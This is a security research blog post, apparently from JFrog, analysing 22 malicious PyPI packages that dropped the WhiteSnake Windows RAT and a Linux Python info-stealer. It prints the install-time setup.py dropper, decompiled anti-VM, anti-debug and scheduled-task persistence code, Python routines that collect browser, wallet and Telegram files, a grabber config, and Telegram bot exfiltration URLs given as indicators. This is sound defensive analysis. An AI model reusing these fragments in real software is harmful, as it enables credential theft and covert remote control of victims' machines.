@@ -1,0 +1,407 @@
+
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214333_744855\WhiteSnakeTargetsPythonDevelopers863x3001.png
+
+The JFrog Security Research team recently discovered a new malware payload in the PyPI repository, written in C#. This is uncommon since PyPI is primarily a repository for Python packages, and its codebase consists mostly of Python code, or natively compiled libraries used by Python programs. This finding raised our concerns about the potential for cross-language malware attacks.
+Our team identified 22 malicious packages, containing the same payload, targeting both Windows and Linux systems by detecting the currently running OS. The Windows-specific payload was identified as a variant of the recently discussed WhiteSnake malware, which has an Anti-VM mechanism, communicates with a C&C server using the Tor protocol, and is capable of stealing information from the victim and executing commands. The Linux-specific payload, on the other hand, is a simpler Python script focused on information stealing, which leaks the stolen data to a Telegram chat via the chatbot API.
+The Security Research team continuously monitors popular open-source software (OSS) repositories such as PyPI, NPM and NuGet using our automated tooling, and reports any vulnerabilities or malicious packages discovered to repository maintainers and the wider community.
+This post provides an analysis of the payloads that were used by the malicious packages that were part of this campaign.
+The Discovered Malicious PyPI Packages
+The following packages were identified as part of the campaign for spreading the WhiteSnake malware:
+
+
+aeodatav04	0.4	WS	14.04.2023
+aeodata	0.4	WS	14.04.2023
+testwhitesnake	0.1	WS	14.04.2023
+testwhitesnake123a	0.1	WS	14.04.2023
+testwhitesnakemodule	0.1	WS	14.04.2023
+test24234	0.1	YOUR NAME	14.04.2023
+test23414234234	0.6	WS	14.04.2023
+test-23234231	0.1	WS	14.04.2023
+tiktokthon	0.1	WS	17.04.2023
+androidspyeye	2.5	WS	17.04.2023
+support-dev	7.8	WS	17.04.2023
+support-hub	0.8	WS	18.04.2023
+social-checker	7.2	develepor_pyton_telethon	19.04.2023
+scrappers	3.5	develepor_pyton_telethon	20.04.2023
+aeivasta	0.3	santic12	20.04.2023
+scrappers-dev	4.1	develepor_pyton_telethon	21.04.2023
+detection-telegram	5.6	develepor_pyton_telethon	21.04.2023
+parser-scrapper	7.2	develepor_pyton_telethon	22.04.2023
+pandirequests	0.1	Brazil	22.04.2023
+panderequests	0.1	Brazil	22.04.2023
+libidrequest	0.4	Brazil	23.04.2023
+pandarequest	0.1	Portugal	23.04.2023
+Technical Analysis of the Malicious Payload
+The Builder
+We believe that the Windows payload of this malicious campaign, which we identified as the WhiteSnake malware, was built using a builder that can be purchased on malware trading platforms in the dark web. As shown in the picture below, the builder receives a Telegram bot token and an account chat ID, which are then used by the WhiteSnake malware to send beacons and keep-alive messages. It also allows choosing the encryption method to be used for logs and leaked data, whether it’s RC4 or a combination of RSA and RC4.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214333_744855\1_TheWhiteSnakebuilder.png
+The WhiteSnake builder
+The Initial Dropper
+The malicious packages use the Python package’s setup.py file, which is executed during installation, in order to determine which payload should be executed. After the package is installed on the victim’s machine, it determines the type of the Operating System on which it’s running, and executes the corresponding payload. In case the package is installed on a Windows system, the WhiteSnake malware is executed. In case the victim is a Linux host, a malicious Python script is executed. As we can see in the picture below, in both cases the payload is Base64-decoded prior to execution –
+if 'sdist' not in argv:
+    if name == 'nt':
+        exec(b64decode('CmltcG9ydCB...'))  # Windows Payload
+    else:
+        exec(b64decode('Vz0ndXRmLTgnC...'))  # Linux Payload
+The Malicious Packages’ setup.py
+Let’s review the functionality of each payload in more detail.
+The Windows Payload: WhiteSnake malware
+The Windows payload is a Remote Access Tool (RAT) written in C#. We used dnSpy, a .NET decompiler and editor tool, to decompile this .NET executable and manually analyze it. Not only does this tool offer decompilation, but it also allows the editing of the application’s bytecode. This came very handy in this case, because this sample included obfuscation techniques such as code entity name-scrambling and string encoding, which were bypassed by editing the application’s bytecode –
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214333_744855\2_Manuallydeobfuscatedcode.png
+Manually deobfuscated code
+The malware’s main capabilities can be divided into four categories:
+
+Anti Debugging and Anti Analysis
+Persistency
+Information gathering and credentials stealing
+Communication with a command and control server using Tor
+The WhiteSnake malware is another rare example of a PyPI attack payload which employs anti-debugging techniques in order to ensure its own safety, similar to payloads previously spotted by our research team. The first function that’s called is ProtectionUtils.antiVM(), which looks at the system’s manufacturer and ensures it’s not on the blacklist. It does so by querying the Manufacturer and Model properties of the default ROOT/CIMV2 WMI namespace. It then compares the values of the aforementioned properties to a blacklist of possible manufacturers and models from which the malware wishes to avoid, in order to evade possible analysis –
+List list = new List
+{
+"virtual",
+"vmbox",
+"vmware",
+"virtualbox",
+"box",
+"thinapp",
+"VMXh",
+"innotek gmbh",
+"tpvcgateway",
+"tpautoconnsvc",
+"vbox",
+"kvm",
+"red hat"
+};
+List of virtual machine manufactures used in anti-debugging routine
+using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\CIMV2", "SELECT * FROM Win32_ComputerSystem"))
+      {
+        foreach (ManagementObject managementObject in managementObjectSearcher.Get())
+        {
+          managementObject.Get();
+          foreach (string str in strArray)
+          {
+            if (managementObject["Manufacturer"].ToString().ToLower().Contains(str)
+            || managementObject["Model"].ToString().ToLower().Contains(str))
+            {
+              flag = true;
+              break;
+            }
+Using WMI to query the system’s manufacturer and model
+Afterwards, the malware verifies whether a debugger is running on the system, or whether a DLL associated with a research tool, such as Sandboxie (SbieDll.dll), HTTP Debugger (HTTPDebuggerBrowser.dll), FiddlerCore (FiddlerCore4.dll) or RestSharp (RestSharp.dll) was injected into the malware process. If any debug mechanism is detected, the malware terminates with some traditional malware foul language.
+if (VMPresent ||
+    Debugger.IsAttached ||
+    Debugger.IsLogging() ||
+    ProtectionUtils.GetModuleHandle("SbieDll.dll") != IntPtr.Zero ||
+    ProtectionUtils.GetModuleHandle("HTTPDebuggerBrowser.dll") != IntPtr.Zero ||
+    ProtectionUtils.GetModuleHandle("FiddlerCore4.dll") != IntPtr.Zero ||
+    ProtectionUtils.GetModuleHandle("RestSharp.dll") != IntPtr.Zero ||
+    ProtectionUtils.GetModuleHandle("Titanium.Web.Proxy.dll") != IntPtr.Zero)
+{
+    Console.WriteLine("F**k off!");
+    Environment.Exit(5);
+}
+The Anti Debugging Function Mode of Operation
+It is worth mentioning that the malware has two nearly identical anti-debugging routines. The first, Antianalysis.antiVM(), is executed right at the beginning, and the other, Program.detectVM(), runs just a few instructions after it.
+ProtectionUtils.antiAnalysis();
+ProtectionUtils.dropStartup();
+try
+{
+    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+}
+catch (Exception ex)
+{
+    Console.WriteLine(ex.Message);
+}
+if (Constants.uc == ProtectionUtils.decodeString("@", "qZAZ", "lOqR") && pE.detectVM())
+These routines have almost identical functionality executed subsequently and are located in two different classes. We assume that the first anti-debugging routine was injected by a “malware builder” that the attacker used to obfuscate the resulting WhiteSnake binary.
+The malware’s anti-analysis obfuscation is relatively simple. It scrambles variable names and encodes all string constants to make manual analysis of the malware harder and prevent static detection, i.e. with Yara rules. The names of all variables, classes, and methods are unreadable, and strings are encoded using the following routine –
+public static string decodeString(string A_0, string A_1, string A_2)
+{
+    string text = string.Empty;
+    for (int i = 0; i < A_0.Length; i++)
+    {
+        text += (A_0[i] ^ (A_1 + A_2)[i % (A_1 + A_2).Length]).ToString();
+    }
+    return text;
+}
+String Obfuscation Routine
+We copied the same routine and used it to decrypt all of the strings, while giving the classes and methods names based on their functionality.
+After the malware runs the anti-debugging mechanism and ensures that the running environment is safe, it takes care of persistency. The malware does so by adding a scheduled task that will launch the malware’s executable every minute, after it’s copied to the folder %localappdata%\NET.Framework. As we can see in the example below, the scheduled task will be created with the default LIMITED runlevel permissions, in case that the affected user didn’t execute the malware with administrator privileges –
+bool is_admin = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
+string location = Assembly.GetEntryAssembly().Location;
+string fake_dir_path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "NET.Framework");
+string malware_path = Path.Combine(fake_dir_path, Path.GetFileName(location));
+if (!Directory.Exists(fake_dir_path))
+{
+   Directory.CreateDirectory(fake_dir_path);
+}
+if (!File.Exists(malware_path))
+{
+   File.Copy(location, malware_path, true);
+   new FileInfo(malware_path).IsReadOnly = true;
+   StringBuilder stringBuilder = new StringBuilder();
+   stringBuilder.Append("/C chcp 65001 && ");
+   stringBuilder.Append("ping 127.0.0.1 && ");
+   stringBuilder.AppendFormat("schtasks /create /tn \"{0}\" /sc MINUTE /tr \"{1}\" /rl {2} /f && ", Path.GetFileNameWithoutExtension(location), malware_path, is_admin ? "HIGHEST" : "LIMITED");
+   stringBuilder.AppendFormat("DEL /F /S /Q /A \"{0}\" &&", location);
+   stringBuilder.AppendFormat("START \"\" \"{0}\"", malware_path);
+   using (Process.Start(new ProcessStartInfo
+   {
+       FileName = "cmd.exe",
+       Arguments = stringBuilder.ToString(),
+       WindowStyle = ProcessWindowStyle.Hidden,
+       CreateNoWindow = true,
+       UseShellExecute = true
+   }))
+}
+After the malware finishes all its preparations, it sends initial information about the infected machine to the attackers using a private Telegram chat.
+This information consists of:
+
+
+Username	Name of the active user
+Compname	Name of the machine
+OS	Version of OS
+Tag	Constant value, always “default”
+IP	External IP address taken from the request to https://ip-api.com
+Screen size	Resolution of the screen
+GPU	Information about the hardware used on the infected system
+CPU	Information about the hardware used on the infected system
+RAM	Information about the hardware used on the infected system
+Disc	Information about the hardware used on the infected system
+Manufacturer	Information about the hardware used on the infected system	
+Model	Information about the hardware used on the infected system	
+Beacon	Address of the onion node (explained below)
+Execution timestamp	System time
+LoadedAssemblies	Dlls loaded into the process
+RunningProcesses	Processes running on the infected system
+Files	Malware looks for files containing authentication data from financial services and sends them to the server
+The malware serializes all of the gathered data into XML format, compresses it using gzip, encrypts it with a symmetric RC4 encryption, and optionally again, asymmetrically using the RSA encryption algorithm. In this case, only the attacker with a private key will be able to access the stolen information.
+WSR$<?xml version="1.0" encoding="utf-16"?>
+<Report xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+ <files>
+   <file filename="Browsers\Chrome\Key" filedata="DymxpZd8QfxCcGpXMzXbMY50B" filesize="0" createdDate="0" modifiedDate="0" />
+   <file filename="Browsers\Edge\Key" filedata="qtUBhhtDOzJPCe5rnJISrKHnU9w" filesize="0" createdDate="0" modifiedDate="0" />
+ </files>
+ <information>
+   <information key="Screenshot" value="/9j/4AAQSkZJRgABAQEAYABgAAD/..."/>
+   <information key="Username" value="user" />
+    <information key="Compname" value="DESKTOP-PC" />
+    <information key="OS" value="Microsoft Windows NT 6.2.9200.0" />
+    <information key="Tag" value="tag" />
+    <information key="IP" value="138.125.xxx.xxx" />
+    <information key="Screen size" value="640x420" />
+    <information key="CPU" value="Intel(R) Core(TM) CPU" />
+    <information key="GPU" value="VMware SVGA 3D" />
+    <information key="RAM" value="1GB" />
+    <information key="Disk" value="5GB" />
+    <information key="Manufacturer" value="VMware, Inc." />
+    <information key="Model" value="VMware />
+    <information key="Beacon" value="" />
+    <information key="Execution timestamp" value="1681234567" />
+    <information key="LoadedAssemblies" value="ntdll;KERNEL32;KERNELBASE;ADVAPI32;msvcrt;..." />
+    <information key="RunningProcesses" value="msedge;ApplicationFrameHost;svchost;svchost;svchost;SearchApp;svchost;SearchFilterHost;msedge;svchost;msedge;msedge;..." />
+ </information>
+ </information>
+</Report>
+Finally the packed and encrypted data is sent to a predetermined Telegram chat, whose tokens for communication via APIs have been compiled into the malware.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214333_744855\3_TheleakeddatareceivedonTelegram.png
+The leaked data received on Telegram
+In addition to the above information, the malware also sends a parameter named “Beacon”. This parameter is the server’s address in the Tor network, and corresponds to the functionality we’ll review in the next part of the article.
+Attackers are always looking to leak sensitive files, and this malware is no different. The “<files>” section of the leaked data contains a dump of files that the malware tries to exfiltrate from the victim’s filesystem. The list of the targets may be loaded from the configuration file or from the external URL, but it has a default value, allowing us to understand the default targets of this attack campaign. Mainly, there are files with credentials from various cryptocurrency and financial services:
+
+Browsers: Mozilla\Firefox, Thunderbird, Google\Chrome, Vivaldi, CocCoc\Browser, CentBrowser, BraveSoftware\Brave-Browser, Chromium, Microsoft\Edge.
+Applications: WinSCP, CoreFTP, Windscripe, Filezilla, AzireVPN, Snowflake, Steam, Discord, The bat, Foxmail, Signal, Pigdin, Telegram.
+Crypto Wallets: Atomic, Wasabi, Binance, Guarda, Coinomi, Bitcoin, Electrum, Electrum-LTC, Zcash, Exodus, Jaxx, Metamask, Ronin, BinanceChain, Tronlink, Phantom.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214333_744855\4_Cryptocurrencygrabberconfig.png
+Cryptocurrency grabber config
+Another interesting (and quite rare!) feature of the malware is the usage of onion routing for receiving commands from the C&C server. Tor provides users with a high level of anonymity by routing their internet traffic through a series of encrypted nodes, making it difficult to trace the communication back to its source. This provides a significant advantage for attackers, helping them to remain anonymous and evade detection while carrying out their activities. Moreover, Tor’s end-to-end traffic encryption may prevent traffic analysis, and can bypass some firewall configurations. However, the implementation and initial setup of the communication are more complex than other types of C&C, so cases of Tor usage are relatively rare. At the initial setup, the malware downloads the latest binary from the Tor project site, unpacks it, and starts using onion routing with a custom (torrc) configuration –
+...
+SOCKSPort torPort + 1
+# The port on which Tor will listen for local connections from Tor controller applications
+ControlPort torPort + 2
+DataDirectory
+# HiddenServicePort x y:z says to redirect requests on port x to the address y:z.
+HiddenServiceDir
+HiddenServicePort 80 127.0.0.1:torPort
+HiddenServiceVersion 3
+The torrc file used by the malware
+The torPort variable in this configuration is a number chosen randomly between 2000 and 7000 each time that the application restarts. It also serves to hide the malware from detection, since using the default Tor port may trigger detection software, firewalls, etc.
+Once Tor is successfully installed and executed on the victim and its address is sent to the attacker, incoming Tor traffic is redirected to the malware, allowing attackers to control the infected machine anonymously.
+Control over the infected machine is implemented with a special protocol, which supports the following commands:
+
+Command	Description
+PING	Sends the string “>>PONG” to the server
+UNINSTALL	Stops all processes, services, and tasks created by the malware, and wipes all files. Used to cover the activity and harden incident response.
+REFRESH	Sends the server information about the system (same structure as the initial sent information).
+SCREENSHOT	Takes a screenshot of the user’s screen, and sends it to the server.
+GET_FILE	Downloads a file from the server to the given location.
+LOADER	Executes an arbitrary command received from the server.
+File path	Uploads arbitrary files from the infected machine to the server.
+The ability to upload any file and run any command combined with the evasion techniques used by malware developers makes the malware very dangerous, effectively allowing the attackers to fully control the infected machine.
+Linux version (Python)
+Unlike the Windows WhiteSnake payload, the Linux payload is a much simpler Python script, with very basic functionality. Although obfuscated (with an unknown obfuscator), it doesn’t contain any anti-VM or anti-debugging mechanisms, and is focused on information stealing, specifically targeting Mozilla Firefox, crypto wallets such as Exodus and Electrum, and other different programs, such as Telegram, Mozilla Thunderbird and Filezilla, and Pidgin.
+At first, the payload collects basic information about the infected machine, including the username, computer name, operating system, and the machine’s IP and the name of its ISP, which are retrieved by making a GET request to http://ip-api.com/line?fields=query,isp. This information is stored in a file called system.json, in a temporary directory that’s created by the malware to collect all the data which is about to be sent to the attackers.
+def gather_system_info():
+    try:
+        http = PoolManager()
+        response = http.request('GET', 'http://ip-api.com/line?fields=query,isp')
+    except HTTPError as e:
+        print(e)
+        ip, isp = '127.0.0.1', 'Unknown'
+    else:
+        ip, isp = response.data.decode(UTF).strip().split('\n')
+        for blacklisted in ['google', 'mythic beasts']:
+            if blacklisted in isp.lower():
+                exit(5)
+
+
+    try:
+        screenshot_data = BytesIO()
+        if HAS_PIL:
+            screenshot = ImageGrab.grab()
+            screenshot.save(screenshot_data, format='png')
+        screenshot_encoded = b64encode(screenshot_data.getvalue()).decode(UTF)
+    except Exception as e:
+        print(e)
+        screenshot_encoded = ''
+
+
+    with open(path.join(temp_dir, 'system.json'), 'w') as f:
+        dump({
+            'Screenshot': screenshot_encoded,
+            'Username': getuser(),
+            'Compname': node(),
+            'OS': platform(),
+            'Tag': team_name,
+            'IP': ip,
+            'ISP': isp,
+            'Execution timestamp': time()
+        }, f)
+After collecting the victim’s information, the payload then proceeds to collect sensitive information from the infected machine, instructed by an XML configuration, which resembles the configuration of binary WhiteSnake payload discussed in the former section of this article.
+<?xml version="1.0" encoding="utf-8"?>
+<Commands xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+  <commands>
+    <command name="2">
+      <args>
+        <string>~/snap/firefox/common/.mozilla/firefox</string>
+        <string>~/.mozilla/firefox</string>
+      </args>
+    </command>
+    <command name="2">
+      <args>
+        <<string>~/.thunderbird</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>~/.config/filezilla</string>
+        <string>sitemanager.xml;recentservers.xml</string>
+        <string>Apps/FileZilla</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>~/.purple</string>
+        <string>accounts.xml</string>
+        <string>Apps/Pidgin</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>~/.local/share/TelegramDesktop/tdata;~/.var/app/org.telegram.desktop/data/TelegramDesktop/tdata;~/snap/telegram-desktop/current/.local/share/TelegramDesktop/tdata</string>
+        <string>*s;????????????????/map?</string>
+        <string>Grabber/Telegram</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>~/.electrum/wallets;~/snap/electrum/current/.electrum/wallets</string>
+        <string>*wallet*</string>
+        <string>Grabber/Wallets/Electrum</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>~/.config/Exodus</string>
+        <string>exodus.conf.json;exodus.wallet/*.seco</string>
+        <string>Grabber/Wallets/Exodus</string>
+      </args>
+    </command>
+  </commands>
+</Commands>
+"""
+The function that’s used to process this configuration parses the XML and performs different actions for browser directories and other directories. For general directories, it will collect files according to predefined names or patterns. For browser folders, the collected files are the following: cookies.sqlite, keys4.db and logins.json.
+def process_cmd(commands):
+    ZIP = ".zip"
+   
+    if commands.startswith("http"):
+        try:
+            http = G()
+            response = http.request(V, commands)
+            commands = response.data.decode(W).strip()
+        except I:
+            commands = ""
+   
+    xml_tree = M.ElementTree(M.fromstring(commands))
+    xml_root = xml_tree.getroot()
+
+
+    for command in xml_root[0]:
+       command_name = int(command.get("name"))
+       if command_name == 0:
+            input_paths = expand_paths(command[0][0].text.split(";"))
+            patterns = command[0][1].text.split(";")
+            output_path = os.path.join(tmp_dir, D[0][2].text)
+            for input_path in input_paths:
+                copy_files(input_path, patterns, output_path)
+        elif command_name == 2:
+            for profile_dir in command[0]:
+                for profile_path in expand_paths([profile_dir.text]):
+                    for prefs_js_path in S(
+                        lambda p: os.path.exists(os.path.join(p, "prefs.js")), glob.glob(os.path.join(profile_path, "*.*"))
+                    ):
+                        browser_name = os.path.basename(os.path.dirname(prefs_js_path)).title()
+                        browser_name = browser_name[1:] if browser_name[0] == "." else browser_name
+                        output_filename = os.path.basename(prefs_js_path)
+                        output_path = os.path.join(B, "Browsers", browser_name, output_filename)
+                        copy_files(prefs_js_path, browser_files, output_path)
+           
+    cmds_out = path.join(tempfile.gettempdir(), secrets.token_hex(8))
+    shutil.make_archive(cmds_out, "zip", tmp_dir)
+    shutil.rmtree(tmp_dir)
+    with open(cmds_out + ZIP, "rb") as i:
+        k = i.read()
+    os.remove(cmds_out + ZIP)
+    return k
+We can see that other than the Mozilla Firefox browser, and the Mozilla Thunderbird email client which is treated as a browser (as can be seen by the command type), the malware is also interested in FileZilla, Pidgin and the Exodus and Electrum wallets.
+After collecting all the information and files mentioned above, an RC4 encrypted package with all the data is then sent to the attackers via a POST request to a Telegram channel, using the following API: hxxps[://]api[.]telegram[.]org/bot6209822134:AAEHrtHFcGSwPxreBCCquU4vzJrpFtyg2kA/sendDocument?chat_id=-1001529292045&caption=Linux.
+Indicators of Compromise (IOCs)
+hxxps[://]api[.]telegram[.]org/bot6209822134:AAEHrtHFcGSwPxreBCCquU4vzJrpFtyg2kA/sendDocument?chat_id=-1001529292045&caption=Linux
+hxxps[://]api[.]telegram[.]org/bot6003786791:AAGBP7Kr5UNFj3_RBmspykT4E01xYv3Lk3Y/sendDocument?chat_id=615133582&caption=Default
+Improved Detection and remediation with JFrog Xray
+As a response to this incident, we have added the malicious Python packages to JFrog Xray, to allow customers to detect them immediately. JFrog Xray’s database of regularly curated packages currently contains more than 165K malicious packages across all relevant ecosystems, and is continuously growing.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\jfrog\20241223_214333_744855\5_JFrogXray.png
+
+Conclusions
+In this blog post, we provided an in-depth analysis of a malicious campaign to propagate malware using the PyPI open source repository. As part of this campaign, the attackers uploaded 22 malicious packages, with the ability to target Windows and Linux machines. The packages’ payload, which are concealed in their setup files, are the WhiteSnake windows malware, which is capable of communicating with a C&C server using Tor, executing commands and stealing data from the victim’s machine. The Linux payload is a simpler Python script, which is also focused on stealing data.
+This campaign was detected by our scanners, which regularly scan packages uploaded to repositories such PyPI, NPM and NuGet. After receiving the first indication and verifying that these packages are indeed malicious, we’ve updated the database which serves our clients so that they can be fully protected against this campaign, and we can trigger an alarm in case they were affected by these packages.
+Stay up-to-date with JFrog Security Research
+Follow the latest discoveries and technical updates from the JFrog Security Research team in our security research blog posts and on Twitter at @JFrogSecurity.
+setup.py
+ProtectionUtils.antiVM()
+ROOT/CIMV2
+SbieDll.dll
+HTTPDebuggerBrowser.dll
+FiddlerCore4.dll
+RestSharp.dll
+Antianalysis.antiVM()
+Program.detectVM()
+%localappdata%\NET.Framework
+http://ip-api.com/line?fields=query,isp
+system.json
+cookies.sqlite
+keys4.db
+logins.json
+hxxps[://]api[.]telegram[.]org/bot6209822134:AAEHrtHFcGSwPxreBCCquU4vzJrpFtyg2kA/sendDocument?chat_id=-1001529292045&caption=Linux
+hxxps[://]api[.]telegram[.]org/bot6209822134:AAEHrtHFcGSwPxreBCCquU4vzJrpFtyg2kA/sendDocument?chat_id=-1001529292045&caption=Linux
+hxxps[://]api[.]telegram[.]org/bot6003786791:AAGBP7Kr5UNFj3_RBmspykT4E01xYv3Lk3Y/sendDocument?chat_id=615133582&caption=Default
